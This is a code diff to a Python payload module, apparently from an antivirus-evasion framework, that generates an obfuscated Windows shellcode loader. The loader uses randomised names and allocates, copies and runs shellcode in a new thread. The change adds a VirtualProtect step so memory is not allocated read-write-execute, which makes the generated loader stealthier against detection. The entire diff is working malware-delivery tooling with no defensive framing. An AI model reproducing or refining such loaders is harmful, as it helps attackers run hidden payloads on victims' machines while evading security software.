@@ -65,6 +65,7 @@ class PayloadModule:
         ShellcodeVariableName = evasion_helpers.randomString()
         RandPtr = evasion_helpers.randomString()
         RandHt = evasion_helpers.randomString()
+        rand_virtual_protect = evasion_helpers.randomString()
 
         # Generate the shellcode
         if not self.cli_shellcode:
@@ -85,8 +86,9 @@ class PayloadModule:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
             payload_code += '\t' * num_tabs_required + ShellcodeVariableName +' = b\'' + Shellcode + '\'\n'
-            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
+            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x04))\n'
             payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
+            payload_code += '\t' * num_tabs_required + rand_virtual_protect + ' = ' + randctypes + '.windll.kernel32.VirtualProtect(' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')),' + randctypes + '.c_int(0x20),' + randctypes + '.byref(' + randctypes + '.c_uint32(0)))\n'
             payload_code += '\t' * num_tabs_required + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
             payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'
 
